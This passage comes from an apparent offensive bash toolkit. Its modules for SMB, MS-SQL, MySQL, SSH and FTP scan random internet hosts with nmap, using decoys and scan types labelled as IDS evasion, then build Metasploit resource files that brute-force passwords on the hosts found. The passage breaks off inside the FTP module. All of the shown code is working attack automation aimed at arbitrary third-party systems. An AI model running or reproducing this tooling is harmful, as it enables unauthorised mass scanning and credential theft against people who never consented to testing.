     echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Building rc files. [${GreenF}OK${white}] ${Reset};
     sleep 1
     echo "hosts -d" > $IPATH/db/msfdb.rc
     echo "hosts -a $rhosts" >> $IPATH/db/msfdb.rc
     echo "setg RHOSTS $rhosts" >> $IPATH/db/msfdb.rc
     echo "setg PASS_FILE $dIc" >> $IPATH/db/msfdb.rc
     echo "setg USER_FILE $dIc" >> $IPATH/db/msfdb.rc
     echo "setg THREADS 30" >> $IPATH/db/msfdb.rc
     echo "setg BRUTEFORCE_SPEED 3" >> $IPATH/db/msfdb.rc
     echo "setg BLANK_PASSWORDS true" >> $IPATH/db/msfdb.rc
     echo "setg STOP_ON_SUCCESS true" >> $IPATH/db/msfdb.rc

       if [ "$OutPuT" = "YES" ]; then
         echo "spool $IPATH/logs/[smb].log" >> $IPATH/db/msfdb.rc
       else
         echo "good" > /dev/null 2>&1
       fi

     echo "resource $IPATH/exploits/smb.rc" >> $IPATH/db/msfdb.rc
     chown $user $IPATH/db/msfdb.rc > /dev/null 2>&1


           cd $IPATH/exploits/
           # using bash SED to replace values in exploit.rc
           cp smb.rc smb.bk > /dev/null 2<&1
           sed -i "s|FlAg|$IdS|g" smb.rc
           cd $IPATH


      # start postgresql+metasploit db
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Selecting exploits [${GreenF}OK${white}] ${Reset};
      sleep 1
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Starting msfconsole ... ${Reset};
      sleep 1


    # access msfdatabase
    xterm -T "METASPLOIT CONSOLE" -geometry 115x23 -e "sudo msfconsole -r $IPATH/db/msfdb.rc"
    echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ 'return' to main menu ... ${Reset};
    if [ "$OutPuT" = "YES" ]; then
      zenity --warning --title="☠ RC-EXPLOITER GENERATED FILES ☠" --text "logfile: $IPATH/logs/[smb].log" --width 480 > /dev/null 2>&1
    else
      echo "good" > /dev/null 2>&1
      sleep 1
    fi


  # clean old files
  mv $IPATH/exploits/smb.bk $IPATH/exploits/smb.rc > /dev/null 2<&1
  chown $user $IPATH/exploits/smb.rc > /dev/null 2>&1


  else
  echo ${RedF}[x]☠ [ current task aborted ]${Reset};
  sleep 2
  fi


else

   Colors;
   echo ${RedF}[x]☠ quiting module... ${Reset};
   sleep 2
fi
}






# ----------------
# ms-sql exploiter
# ----------------
sh_3 () {
Colors;
# search in wan OR manually input rhosts
aTv=$(zenity --list --title "☠ ATTACK VECTOR ☠" --text "Available scans" --radiolist --column "Pick" --column "Option" TRUE "Scan WAN for hosts" FALSE "input RHOSTS manually" --width 350 --height 165) > /dev/null 2>&1
# sellect IDS evading port scanning technic to use ...
IdS=$(zenity --list --title "☠ IDS EVADING TECHNIC ☠" --text "\nAvailable port scans:" --radiolist --column "Pick" --column "Option" TRUE "TCP Stealth scan (default)" FALSE "TCP Null Scan" FALSE "TCP Fin scan" FALSE "TCP Xmas scan" FALSE "fragmented packets" --width 320 --height 270) > /dev/null 2>&1

# IDS evading port scanning technic to use
if [ "$IdS" = "TCP Stealth scan (default)" ]; then
  IdS="-sS"
elif [ "$IdS" = "TCP Null Scan" ]; then
  IdS="-sN"
elif [ "$IdS" = "TCP Fin scan" ]; then
  IdS="-sF"
elif [ "$IdS" = "TCP Xmas scan" ]; then
  IdS="-sX"
elif [ "$IdS" = "fragmented packets" ]; then
  IdS="-f"
fi


   if [ "$aTv" = "Scan WAN for hosts" ]; then
     NUM=$(zenity --title "☠ Nº LIMIT OF HOSTS TO FOUND ☠" --text "Input the maximus nunber of random IP's to found\nChose from 1 to 1024 random hosts to found" --entry --width 350) > /dev/null 2>&1
     dIc=$(zenity --title "☠ BRUTE FORCE DICIONARY PATH ☠" --filename=$IPATH --file-selection --text "chose dicionary file to use\nexample: $IPATH/bin/user-passw.txt") > /dev/null 2>&1

     # use DECOY'S in scanning WAN networks?
     if [ "$ChE" = "YES" ]; then
     # use decoys to scan wan networks
     echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Scanning [${GreenF}WAN${white}] network... ${Reset};
     nmap $IdS -T4 -iR $NUM -D $SPooF,$IP -PN -n -p 1433 --open --reason -oN $IPATH/logs/Random-Hosts[ms-sql].log | zenity --progress --pulsate --title "☠ SCANNING WAN NETWORK ☠" --text="FIND: $NUM ONLY: open PORTS: 1433\nLOGFILE: Random-Hosts[ms-sql].log\nUSING DECOY: $SPooF\nSPOOFED MAC: $st\n\nScanning 1024 random hosts..." --percentage=0 --auto-close --width 330 > /dev/null 2>&1
     else
     # default (dont use decoys)
     echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Scanning [${GreenF}WAN${white}] network... ${Reset};
     nmap $IdS -T4 -iR $NUM -PN -n -p 1433 --open --reason -oN $IPATH/logs/Random-Hosts[ms-sql].log | zenity --progress --pulsate --title "☠ SCANNING WAN NETWORK ☠" --text="FIND: $NUM ONLY: open PORTS: 1433\nLOGFILE: Random-Hosts[ms-sql].log\nSPOOFED MAC: $st\n\nScanning 1024 random hosts..." --percentage=0 --auto-close --width 330 > /dev/null 2>&1
     fi

     echo ""
     # display on screen hosts found
     cat $IPATH/logs/Random-Hosts[ms-sql].log
     echo ""

       # generate (settings) resource file
       rhosts=$(zenity --title="☠ Input RHOSTS ☠" --text "To input more than one target (RHOSTS)\njust seperate then by a blank space...\n\nexample: 192.44.100.86 182.11.100.23" --entry --width 360) > /dev/null 2>&1
         if [ "$?" -eq "0" ]; then
       echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Building rc files. [${GreenF}OK${white}] ${Reset};
       sleep 1

       if [ "$OutPuT" = "YES" ]; then
         echo "spool $IPATH/logs/[ms-sql].log" >> $IPATH/db/msfdb.rc
       else
         echo "hosts -d" > $IPATH/db/msfdb.rc
       fi

       echo "hosts -d" > $IPATH/db/msfdb.rc
       echo "hosts -a $rhosts" >> $IPATH/db/msfdb.rc
       echo "setg RHOSTS $rhosts" >> $IPATH/db/msfdb.rc
       echo "setg THREADS 30" >> $IPATH/db/msfdb.rc
       echo "setg MSSQL_PASS_FILE $dIc" >> $IPATH/db/msfdb.rc
       echo "setg PASS_FILE $dIc" >> $IPATH/db/msfdb.rc
       echo "setg BRUTEFORCE_SPEED 3" >> $IPATH/db/msfdb.rc
       echo "setg BLANK_PASSWORDS true" >> $IPATH/db/msfdb.rc
       echo "setg STOP_ON_SUCCESS true" >> $IPATH/db/msfdb.rc

       if [ "$OutPuT" = "YES" ]; then
         echo "spool $IPATH/logs/[ms-sql].log" >> $IPATH/db/msfdb.rc
       else
         echo "good" > /dev/null 2>&1
       fi

       echo "resource $IPATH/exploits/ms-sql.rc" >> $IPATH/db/msfdb.rc
       chown $user $IPATH/logs/Random-Hosts[ms-sql].log > /dev/null 2>&1
       chown $user $IPATH/db/msfdb.rc > /dev/null 2>&1


         cd $IPATH/exploits/
         # using bash SED to replace values in exploit.rc
         cp ms-sql.rc ms-sql.bk > /dev/null 2<&1
         sed -i "s|R3PL4C3|$dIc|g" ms-sql.rc
         sed -i "s|FlAg|$IdS|g" ms-sql.rc
         cd $IPATH

     # start postgresql+metasploit db
     echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Selecting exploits [${GreenF}OK${white}] ${Reset};
     sleep 1
     echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Starting msfconsole ... ${Reset};
     sleep 1


    # access msfconsole
    xterm -T "METASPLOIT CONSOLE" -geometry 115x23 -e "sudo msfconsole -r $IPATH/db/msfdb.rc"
    echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ 'return' to main menu ... ${Reset};
    if [ "$OutPuT" = "YES" ]; then
      zenity --warning --title="☠ RC-EXPLOITER GENERATED FILES ☠" --text "logfile: $IPATH/logs/[ms-sql].log" --width 480 > /dev/null 2>&1
    else
      echo "good" > /dev/null 2>&1
      sleep 1
    fi

  # clean old files
  mv $IPATH/exploits/ms-sql.bk $IPATH/exploits/ms-sql.rc > /dev/null 2<&1
  rm $IPATH/exploits/copy.int > /dev/null 2>&1
  chown $user $IPATH/exploits/ms-sql.rc > /dev/null 2>&1


  else
  echo ${RedF}[x]☠ [ current task aborted ]${Reset};
  sleep 2
  fi



   elif [ "$aTv" = "input RHOSTS manually" ]; then
  # imput manually RHOSTS
  rhosts=$(zenity --title="☠ Input RHOSTS ☠" --text "To input more than one target (RHOSTS)\njust seperate then by a blank space...\n\nexample: 192.44.100.86 182.11.100.23" --entry --width 360) > /dev/null 2>&1
     if [ "$?" -eq "0" ]; then
     dIc=$(zenity --title "☠ BRUTE FORCE DICIONARY PATH ☠" --filename=$IPATH --file-selection --text "chose dicionary file to use\nexample: $IPATH/bin/user-passw.txt") > /dev/null 2>&1

     # generate (settings) resource file
     echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Building rc files. [${GreenF}OK${white}] ${Reset};
     sleep 1
     echo "hosts -d" > $IPATH/db/msfdb.rc
     echo "hosts -a $rhosts" >> $IPATH/db/msfdb.rc
     echo "setg RHOSTS $rhosts" >> $IPATH/db/msfdb.rc
     echo "setg THREADS 30" >> $IPATH/db/msfdb.rc
     echo "setg MSSQL_PASS_FILE $dIc" >> $IPATH/db/msfdb.rc
     echo "setg PASS_FILE $dIc" >> $IPATH/db/msfdb.rc
     echo "setg BRUTEFORCE_SPEED 3" >> $IPATH/db/msfdb.rc
     echo "setg BLANK_PASSWORDS true" >> $IPATH/db/msfdb.rc
     echo "setg STOP_ON_SUCCESS true" >> $IPATH/db/msfdb.rc

       if [ "$OutPuT" = "YES" ]; then
         echo "spool $IPATH/logs/[ms-sql].log" >> $IPATH/db/msfdb.rc
       else
         echo "good" > /dev/null 2>&1
       fi

     echo "resource $IPATH/exploits/ms-sql.rc" >> $IPATH/db/msfdb.rc
     chown $user $IPATH/db/msfdb.rc > /dev/null 2>&1


         cd $IPATH/exploits/
         # using bash SED to replace values in exploit.rc
         cp ms-sql.rc ms-sql.bk > /dev/null 2<&1
         sed -i "s|R3PL4C3|$dIc|g" ms-sql.rc
         sed -i "s|FlAg|$IdS|g" ms-sql.rc
         cd $IPATH

      # start postgresql+metasploit db
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Selecting exploits [${GreenF}OK${white}] ${Reset};
      sleep 1
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Starting msfconsole ... ${Reset};
      sleep 1


    # access msfdatabase
    xterm -T "METASPLOIT CONSOLE" -geometry 115x23 -e "sudo msfconsole -r $IPATH/db/msfdb.rc"
    echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ 'return' to main menu ... ${Reset};
    if [ "$OutPuT" = "YES" ]; then
      zenity --warning --title="☠ RC-EXPLOITER GENERATED FILES ☠" --text "logfile: $IPATH/logs/[ms-sql].log" --width 480 > /dev/null 2>&1
    else
      echo "good" > /dev/null 2>&1
      sleep 1
    fi

  # clean old files
  mv $IPATH/exploits/ms-sql.bk $IPATH/exploits/ms-sql.rc > /dev/null 2<&1
  rm $IPATH/exploits/copy.int > /dev/null 2>&1
  chown $user $IPATH/exploits/ms-sql.rc > /dev/null 2>&1

  else
  echo ${RedF}[x]☠ [ current task aborted ]${Reset};
  sleep 2
  fi


else

   Colors;
   echo ${RedF}[x]☠ quiting module... ${Reset};
   sleep 2
fi
}






# ---------------
# mysql exploiter
# ---------------
sh_4 () {
Colors;
# search in wan OR manually input rhosts
aTv=$(zenity --list --title "☠ ATTACK VECTOR ☠" --text "Available scans" --radiolist --column "Pick" --column "Option" TRUE "Scan WAN for hosts" FALSE "input RHOSTS manually" --width 350 --height 165) > /dev/null 2>&1
# sellect IDS evading port scanning technic to use ...
IdS=$(zenity --list --title "☠ IDS EVADING TECHNIC ☠" --text "\nAvailable port scans:" --radiolist --column "Pick" --column "Option" TRUE "TCP Stealth scan (default)" FALSE "TCP Null Scan" FALSE "TCP Fin scan" FALSE "TCP Xmas scan" FALSE "fragmented packets" --width 320 --height 270) > /dev/null 2>&1

# IDS evading port scanning technic to use
if [ "$IdS" = "TCP Stealth scan (default)" ]; then
  IdS="-sS"
elif [ "$IdS" = "TCP Null Scan" ]; then
  IdS="-sN"
elif [ "$IdS" = "TCP Fin scan" ]; then
  IdS="-sF"
elif [ "$IdS" = "TCP Xmas scan" ]; then
  IdS="-sX"
elif [ "$IdS" = "fragmented packets" ]; then
  IdS="-f"
fi


   if [ "$aTv" = "Scan WAN for hosts" ]; then
     NUM=$(zenity --title "☠ Nº LIMIT OF HOSTS TO FOUND ☠" --text "Input the maximus nunber of random IP's to found\nChose from 1 to 1024 random hosts to found" --entry --width 350) > /dev/null 2>&1
     dIc=$(zenity --title "☠ BRUTE FORCE DICIONARY PATH ☠" --filename=$IPATH --file-selection --text "chose dicionary file to use\nexample: $IPATH/bin/user-passw.txt") > /dev/null 2>&1

     # use DECOY'S in scanning WAN networks?
     if [ "$ChE" = "YES" ]; then
     # use decoys to scan wan networks
     echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Scanning [${GreenF}WAN${white}] network... ${Reset};
     nmap $IdS -T4 -iR $NUM -D $SPooF,$IP -PN -n -p 3306 --open --reason -oN $IPATH/logs/Random-Hosts[mysql].log | zenity --progress --pulsate --title "☠ SCANNING WAN NETWORK ☠" --text="FIND: $NUM ONLY: open PORTS: 3306\nLOGFILE: Random-Hosts[mysql].log\nUSING DECOY: $SPooF\nSPOOFED MAC: $st\n\nScanning 1024 random hosts..." --percentage=0 --auto-close --width 330 > /dev/null 2>&1
     else
     # default (dont use decoys)
     echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Scanning [${GreenF}WAN${white}] network... ${Reset};
     nmap $IdS -T4 -iR $NUM -PN -n -p 3306 --open --reason -oN $IPATH/logs/Random-Hosts[mysql].log | zenity --progress --pulsate --title "☠ SCANNING WAN NETWORK ☠" --text="FIND: $NUM ONLY: open PORTS: 3306\nLOGFILE: Random-Hosts[mysql].log\nSPOOFED MAC: $st\n\nScanning 1024 random hosts..." --percentage=0 --auto-close --width 330 > /dev/null 2>&1
     fi

     echo ""
     # display on screen hosts found
     cat $IPATH/logs/Random-Hosts[mysql].log
     echo ""

       # generate (settings) resource file
       rhosts=$(zenity --title="☠ Input RHOSTS ☠" --text "To input more than one target (RHOSTS)\njust seperate then by a blank space...\n\nexample: 192.44.100.86 182.11.100.23" --entry --width 360) > /dev/null 2>&1
         if [ "$?" -eq "0" ]; then
       echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Building rc files. [${GreenF}OK${white}] ${Reset};
       sleep 1
       echo "hosts -d" > $IPATH/db/msfdb.rc
       echo "hosts -a $rhosts" >> $IPATH/db/msfdb.rc
       echo "setg THREADS 30" >> $IPATH/db/msfdb.rc
       echo "setg RHOSTS $rhosts" >> $IPATH/db/msfdb.rc
       echo "setg MYSQL_PASS_FILE $dIc" >> $IPATH/db/msfdb.rc
       echo "setg BRUTEFORCE_SPEED 3" >> $IPATH/db/msfdb.rc
       echo "setg BLANK_PASSWORDS true" >> $IPATH/db/msfdb.rc
       echo "setg STOP_ON_SUCCESS true" >> $IPATH/db/msfdb.rc

       if [ "$OutPuT" = "YES" ]; then
         echo "spool $IPATH/logs/[mysql].log" >> $IPATH/db/msfdb.rc
       else
         echo "good" > /dev/null 2>&1
       fi

       echo "resource $IPATH/exploits/mysql.rc" >> $IPATH/db/msfdb.rc
       chown $user $IPATH/db/msfdb.rc > /dev/null 2>&1
       chown $user $IPATH/logs/Random-Hosts[mysql].log > /dev/null 2>&1


         cd $IPATH/exploits/
         # using bash SED to replace values in exploit.rc
         cp mysql.rc mysql.bk > /dev/null 2<&1
         sed -i "s|FlAg|$IdS|g" mysql.rc
         cd $IPATH


      # start postgresql+metasploit db
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Selecting exploits [${GreenF}OK${white}] ${Reset};
      sleep 1
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Starting msfconsole ... ${Reset};
      sleep 1


    # access msfdatabase
    xterm -T "METASPLOIT CONSOLE" -geometry 115x23 -e "sudo msfconsole -r $IPATH/db/msfdb.rc"
    echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ 'return' to main menu ... ${Reset};
    if [ "$OutPuT" = "YES" ]; then
      zenity --warning --title="☠ RC-EXPLOITER GENERATED FILES ☠" --text "logfile: $IPATH/logs/[mysql].log" --width 480 > /dev/null 2>&1
    else
      echo "good" > /dev/null 2>&1
      sleep 1
    fi


  # clean old files
  mv $IPATH/exploits/mysql.bk $IPATH/exploits/mysql.rc > /dev/null 2<&1
  chown $user $IPATH/exploits/mysql.rc > /dev/null 2>&1

  else
  echo ${RedF}[x]☠ [ current task aborted ]${Reset};
  sleep 2
  fi



   elif [ "$aTv" = "input RHOSTS manually" ]; then
  # imput manually RHOSTS
  rhosts=$(zenity --title="☠ Input RHOSTS ☠" --text "To input more than one target (RHOSTS)\njust seperate then by a blank space...\n\nexample: 192.44.100.86 182.11.100.23" --entry --width 360) > /dev/null 2>&1
     if [ "$?" -eq "0" ]; then
     dIc=$(zenity --title "☠ BRUTE FORCE DICIONARY PATH ☠" --filename=$IPATH --file-selection --text "chose dicionary file to use\nexample: $IPATH/bin/user-passw.txt") > /dev/null 2>&1

     # generate (settings) resource file
     echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Building rc files. [${GreenF}OK${white}] ${Reset};
     sleep 1
     echo "hosts -d" > $IPATH/db/msfdb.rc
     echo "hosts -a $rhosts" >> $IPATH/db/msfdb.rc
     echo "setg RHOSTS $rhosts" >> $IPATH/db/msfdb.rc
     echo "setg THREADS 30" >> $IPATH/db/msfdb.rc
     echo "setg MYSQL_PASS_FILE $dIc" >> $IPATH/db/msfdb.rc
     echo "setg BRUTEFORCE_SPEED 3" >> $IPATH/db/msfdb.rc
     echo "setg BLANK_PASSWORDS true" >> $IPATH/db/msfdb.rc
     echo "setg STOP_ON_SUCCESS true" >> $IPATH/db/msfdb.rc

       if [ "$OutPuT" = "YES" ]; then
         echo "spool $IPATH/logs/[mysql].log" >> $IPATH/db/msfdb.rc
       else
         echo "good" > /dev/null 2>&1
       fi

     echo "resource $IPATH/exploits/mysql.rc" >> $IPATH/db/msfdb.rc
     chown $user $IPATH/db/msfdb.rc > /dev/null 2>&1


         cd $IPATH/exploits/
         # using bash SED to replace values in exploit.rc
         cp mysql.rc mysql.bk > /dev/null 2<&1
         sed -i "s|FlAg|$IdS|g" mysql.rc
         cd $IPATH

      # start postgresql+metasploit db
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Selecting exploits [${GreenF}OK${white}] ${Reset};
      sleep 1
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Starting msfconsole ... ${Reset};
      sleep 1


    # access msfdatabase
    xterm -T "METASPLOIT CONSOLE" -geometry 115x23 -e "sudo msfconsole -r $IPATH/db/msfdb.rc"
    echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ 'return' to main menu ... ${Reset};
    if [ "$OutPuT" = "YES" ]; then
      zenity --warning --title="☠ RC-EXPLOITER GENERATED FILES ☠" --text "logfile: $IPATH/logs/[mysql].log" --width 480 > /dev/null 2>&1
    else
      echo "good" > /dev/null 2>&1
      sleep 1
    fi


  # clean old files
  mv $IPATH/exploits/mysql.bk $IPATH/exploits/mysql.rc > /dev/null 2<&1
  chown $user $IPATH/exploits/mysql.rc > /dev/null 2>&1

  else
  echo ${RedF}[x]☠ [ current task aborted ]${Reset};
  sleep 2
  fi


else

   Colors;
   echo ${RedF}[x]☠ quiting module... ${Reset};
   sleep 2
fi
}






# -------------
# ssh exploiter
# -------------
sh_5 () {
Colors;
# search in wan OR manually input rhosts
aTv=$(zenity --list --title "☠ ATTACK VECTOR ☠" --text "Available scans" --radiolist --column "Pick" --column "Option" TRUE "Scan WAN for hosts" FALSE "input RHOSTS manually" --width 350 --height 165) > /dev/null 2>&1
# sellect IDS evading port scanning technic to use ...
IdS=$(zenity --list --title "☠ IDS EVADING TECHNIC ☠" --text "\nAvailable port scans:" --radiolist --column "Pick" --column "Option" TRUE "TCP Stealth scan (default)" FALSE "TCP Null Scan" FALSE "TCP Fin scan" FALSE "TCP Xmas scan" FALSE "fragmented packets" --width 320 --height 270) > /dev/null 2>&1

# IDS evading port scanning technic to use
if [ "$IdS" = "TCP Stealth scan (default)" ]; then
  IdS="-sS"
elif [ "$IdS" = "TCP Null Scan" ]; then
  IdS="-sN"
elif [ "$IdS" = "TCP Fin scan" ]; then
  IdS="-sF"
elif [ "$IdS" = "TCP Xmas scan" ]; then
  IdS="-sX"
elif [ "$IdS" = "fragmented packets" ]; then
  IdS="-f"
fi


   if [ "$aTv" = "Scan WAN for hosts" ]; then
     NUM=$(zenity --title "☠ Nº LIMIT OF HOSTS TO FOUND ☠" --text "Input the maximus nunber of random IP's to found\nChose from 1 to 1024 random hosts to found" --entry --width 350) > /dev/null 2>&1
     dIc=$(zenity --title "☠ BRUTE FORCE DICIONARY PATH ☠" --filename=$IPATH --file-selection --text "chose dicionary file to use\nexample: $IPATH/bin/user-passw.txt") > /dev/null 2>&1

     # use DECOY'S in scanning WAN networks?
     if [ "$ChE" = "YES" ]; then
     # use decoys to scan wan networks
     echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Scanning [${GreenF}WAN${white}] network... ${Reset};
     nmap $IdS -T4 -iR $NUM -D $SPooF,$IP -PN -n -p 22 --open --reason -oN $IPATH/logs/Random-Hosts[SSH].log | zenity --progress --pulsate --title "☠ SCANNING WAN NETWORKS ☠" --text="FIND: $NUM ONLY: open PORTS: 22\nLOGFILE: Random-Hosts[SSH].log\nUSING DECOY: $SPooF\nSPOOFED MAC: $st\n\nScanning 1024 random hosts..." --percentage=0 --auto-close --width 330 > /dev/null 2>&1
     else
     # default (dont use decoys)
     echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Scanning [${GreenF}WAN${white}] network... ${Reset};
     nmap $IdS -T4 -iR $NUM -PN -n -p 22 --open --reason -oN $IPATH/logs/Random-Hosts[SSH].log | zenity --progress --pulsate --title "☠ SCANNING WAN NETWORKS ☠" --text="FIND: $NUM ONLY: open PORTS: 22\nLOGFILE: Random-Hosts[SSH].log\nSPOOFED MAC: $st\n\nScanning 1024 random hosts..." --percentage=0 --auto-close --width 330 > /dev/null 2>&1
     fi

     echo ""
     # display on screen hosts found
     cat $IPATH/logs/Random-Hosts[SSH].log
     echo ""

       # generate (settings) resource file
       rhosts=$(zenity --title="☠ Input RHOSTS ☠" --text "To input more than one target (RHOSTS)\njust seperate then by a blank space...\n\nexample: 192.44.100.86 182.11.100.23" --entry --width 360) > /dev/null 2>&1
         if [ "$?" -eq "0" ]; then
       echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Building rc files. [${GreenF}OK${white}] ${Reset};
       sleep 1
       echo "hosts -d" > $IPATH/db/msfdb.rc
       echo "hosts -a $rhosts" >> $IPATH/db/msfdb.rc
       echo "setg RHOSTS $rhosts" >> $IPATH/db/msfdb.rc
       echo "setg USER_FILE $dIc" >> $IPATH/db/msfdb.rc
       echo "setg PASS_FILE $dIc" >> $IPATH/db/msfdb.rc
       echo "setg THREADS 30" >> $IPATH/db/msfdb.rc
       echo "setg BRUTEFORCE_SPEED 3" >> $IPATH/db/msfdb.rc
       echo "setg BLANK_PASSWORDS true" >> $IPATH/db/msfdb.rc
       echo "setg STOP_ON_SUCCESS true" >> $IPATH/db/msfdb.rc

       if [ "$OutPuT" = "YES" ]; then
         echo "spool $IPATH/logs/[ssh].log" >> $IPATH/db/msfdb.rc
       else
         echo "good" > /dev/null 2>&1
       fi

       echo "resource $IPATH/exploits/ssh.rc" >> $IPATH/db/msfdb.rc
       chown $user $IPATH/db/msfdb.rc > /dev/null 2>&1
       chown $user $IPATH/logs/Random-Hosts[SSH].log > /dev/null 2>&1


         cd $IPATH/exploits/
         # using bash SED to replace values in exploit.rc
         cp ssh.rc ssh.bk > /dev/null 2<&1
         sed -i "s|FlAg|$IdS|g" ssh.rc
         cd $IPATH

      # start postgresql+metasploit db
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Selecting exploits [${GreenF}OK${white}] ${Reset};
      sleep 1
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Starting msfconsole ... ${Reset};
      sleep 1


    # access msfdatabase
    xterm -T "METASPLOIT CONSOLE" -geometry 115x23 -e "sudo msfconsole -r $IPATH/db/msfdb.rc"
    echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ 'return' to main menu ... ${Reset};
    if [ "$OutPuT" = "YES" ]; then
      zenity --warning --title="☠ RC-EXPLOITER GENERATED FILES ☠" --text "logfile: $IPATH/logs/[ssh].log" --width 480 > /dev/null 2>&1
    else
      echo "good" > /dev/null 2>&1
      sleep 1
    fi


  # clean old files
  mv $IPATH/exploits/ssh.bk $IPATH/exploits/ssh.rc > /dev/null 2<&1
  chown $user $IPATH/exploits/ssh.rc > /dev/null 2>&1

  else
  echo ${RedF}[x]☠ [ current task aborted ]${Reset};
  sleep 2
  fi



   elif [ "$aTv" = "input RHOSTS manually" ]; then
  # imput manually RHOSTS
  rhosts=$(zenity --title="☠ Input RHOSTS ☠" --text "To input more than one target (RHOSTS)\njust seperate then by a blank space...\n\nexample: 192.44.100.86 182.11.100.23" --entry --width 360) > /dev/null 2>&1
     if [ "$?" -eq "0" ]; then
     dIc=$(zenity --title "☠ BRUTE FORCE DICIONARY PATH ☠" --filename=$IPATH --file-selection --text "chose dicionary file to use\nexample: $IPATH/bin/user-passw.txt") > /dev/null 2>&1

    # generate (settings) resource file
    echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Building rc files. [${GreenF}OK${white}] ${Reset};
    sleep 1
    echo "hosts -d" > $IPATH/db/msfdb.rc
    echo "hosts -a $rhosts" >> $IPATH/db/msfdb.rc
    echo "setg RHOSTS $rhosts" >> $IPATH/db/msfdb.rc
    echo "setg USER_FILE $dIc" >> $IPATH/db/msfdb.rc
    echo "setg PASS_FILE $dIc" >> $IPATH/db/msfdb.rc
    echo "setg THREADS 30" >> $IPATH/db/msfdb.rc
    echo "setg BRUTEFORCE_SPEED 3" >> $IPATH/db/msfdb.rc
    echo "setg BLANK_PASSWORDS true" >> $IPATH/db/msfdb.rc
    echo "setg STOP_ON_SUCCESS true" >> $IPATH/db/msfdb.rc

       if [ "$OutPuT" = "YES" ]; then
         echo "spool $IPATH/logs/[ssh].log" >> $IPATH/db/msfdb.rc
       else
         echo "good" > /dev/null 2>&1
       fi

    echo "resource $IPATH/exploits/ssh.rc" >> $IPATH/db/msfdb.rc
    chown $user $IPATH/db/msfdb.rc > /dev/null 2>&1


         cd $IPATH/exploits/
         # using bash SED to replace values in exploit.rc
         cp ssh.rc ssh.bk > /dev/null 2<&1
         sed -i "s|FlAg|$IdS|g" ssh.rc
         cd $IPATH


      # start postgresql+metasploit db
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Selecting exploits [${GreenF}OK${white}] ${Reset};
      sleep 1
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Starting msfconsole ... ${Reset};
      sleep 1


    # access msfdatabase
    xterm -T "METASPLOIT CONSOLE" -geometry 115x23 -e "sudo msfconsole -r $IPATH/db/msfdb.rc"
    echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ 'return' to main menu ... ${Reset};
    if [ "$OutPuT" = "YES" ]; then
      zenity --warning --title="☠ RC-EXPLOITER GENERATED FILES ☠" --text "logfile: $IPATH/logs/[ssh].log" --width 480 > /dev/null 2>&1
    else
      echo "good" > /dev/null 2>&1
      sleep 1
    fi

  # clean old files
  mv $IPATH/exploits/ssh.bk $IPATH/exploits/ssh.rc > /dev/null 2<&1
  chown $user $IPATH/exploits/ssh.rc > /dev/null 2>&1

  else
  echo ${RedF}[x]☠ [ current task aborted ]${Reset};
  sleep 2
  fi


else

   Colors;
   echo ${RedF}[x]☠ quiting module... ${Reset};
   sleep 2
fi
}






# -------------
# ftp exploiter
# -------------
sh_6 () {
Colors;
# search in wan OR manually input rhosts
aTv=$(zenity --list --title "☠ ATTACK VECTOR ☠" --text "Available scans" --radiolist --column "Pick" --column "Option" TRUE "Scan WAN for hosts" FALSE "input RHOSTS manually" --width 350 --height 165) > /dev/null 2>&1
# sellect IDS evading port scanning technic to use ...
IdS=$(zenity --list --title "☠ IDS EVADING TECHNIC ☠" --text "\nAvailable port scans:" --radiolist --column "Pick" --column "Option" TRUE "TCP Stealth scan (default)" FALSE "TCP Null Scan" FALSE "TCP Fin scan" FALSE "TCP Xmas scan" FALSE "fragmented packets" --width 320 --height 270) > /dev/null 2>&1

# IDS evading port scanning technic to use
if [ "$IdS" = "TCP Stealth scan (default)" ]; then
  IdS="-sS"
elif [ "$IdS" = "TCP Null Scan" ]; then
  IdS="-sN"
elif [ "$IdS" = "TCP Fin scan" ]; then
  IdS="-sF"
elif [ "$IdS" = "TCP Xmas scan" ]; then
  IdS="-sX"
elif [ "$IdS" = "fragmented packets" ]; then
  IdS="-f"
fi


   if [ "$aTv" = "Scan WAN for hosts" ]; then
     NUM=$(zenity --title "☠ Nº LIMIT OF HOSTS TO FOUND ☠" --text "Input the maximus nunber of random IP's to found\nChose from 1 to 1024 random hosts to found" --entry --width 350) > /dev/null 2>&1
     dIc=$(zenity --title "☠ BRUTE FORCE DICIONARY PATH ☠" --filename=$IPATH --file-selection --text "chose dicionary file to use\nexample: $IPATH/bin/user-passw.txt") > /dev/null 2>&1

     # use DECOY'S in scanning WAN networks?
     if [ "$ChE" = "YES" ]; then
     # use decoys to scan wan networks
     echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Scanning [${GreenF}WAN${white}] network... ${Reset};
